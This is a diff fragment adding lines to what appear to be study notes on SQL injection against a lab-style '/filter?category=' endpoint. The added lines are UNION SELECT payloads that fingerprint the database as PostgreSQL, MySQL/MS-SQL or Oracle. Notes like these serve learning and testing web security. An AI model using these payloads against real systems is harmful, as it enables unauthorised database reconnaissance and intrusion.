@@ -71,4 +71,9 @@ Ans  : GET /filter?category='
        ' union select 'ABC','DEF' --+
 
      - Find DataBase Type:
+       'union select version(),'DEF' --+  : PgSql
        
+       'union select @@version,'DEF' --+  : MYSql/MS-SQL
+
+       'union SELECT banner,'DEF' FROM v$version  --+   :Oracle 
+       'union SELECT version,'DEF' FROM v$instance --+  :Oracle 
